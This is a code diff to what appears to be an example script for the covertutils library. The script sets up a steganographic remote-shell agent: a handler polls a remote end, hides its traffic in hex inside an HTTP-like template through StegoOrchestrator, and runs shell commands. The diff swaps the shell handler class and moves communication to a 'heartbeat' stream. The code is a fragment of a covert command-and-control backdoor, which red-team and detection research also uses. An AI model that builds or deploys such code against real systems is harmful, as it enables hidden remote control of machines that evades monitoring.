@@ -9,7 +9,7 @@
 # the concept of 'StegoOrchestrator' class and network wrapper functions
 
 from covertutils.handlers import InterrogatingHandler, FunctionDictHandler
-from covertutils.handlers.impl import SimpleShellHandler
+from covertutils.handlers.impl import StandardShellHandler
 from covertutils.orchestration import StegoOrchestrator
 from covertutils.datamanipulation import asciiToHexTemplate
 
@@ -71,11 +71,11 @@ req = """%s"""
 # We need a handler that will ask for and deliver data, initiating a communication once every 2-3 seconds.
 # This behavior is modelled in the 'InterrogatingHandler' with the 'delay_between' argument.
 # The 'FunctionDictHandler' automatically runs all messages through function found in a given dict
-class ShellHandler ( InterrogatingHandler, SimpleShellHandler ) :
+class ShellHandler ( InterrogatingHandler, StandardShellHandler ) :
 
 	def __init__( self, recv, send, orch ) :
 		super( ShellHandler, self ).__init__( recv, send, orch, # basic handler arguments
-											fetch_stream = 'main',	# argument from 'InterrogatingHandler'
+											fetch_stream = 'heartbeat',	# argument from 'InterrogatingHandler'
 											# function_dict = _function_dict, # argument from 'FunctionDictHandler'
 											delay_between = (0.0, 4),	 # argument from 'InterrogatingHandler'
 											# delay_between = (2, 3)	 # argument from 'InterrogatingHandler'
@@ -149,7 +149,9 @@ orch = StegoOrchestrator( passphrase,
 							stego_config = stego_config,
 							main_template = "resp",		# The template to be used
 							hex_inject = True,			# Inject data in template in hex mode
-							reverse = True )			# For 2 Orchestrator objects to be compatible one must have 'reverse = True'
+							reverse = True, 			# For 2 Orchestrator objects to be compatible one must have 'reverse = True'
+							streams = ['heartbeat'],
+							)
 
 handler = ShellHandler( recv, send, orch )
 
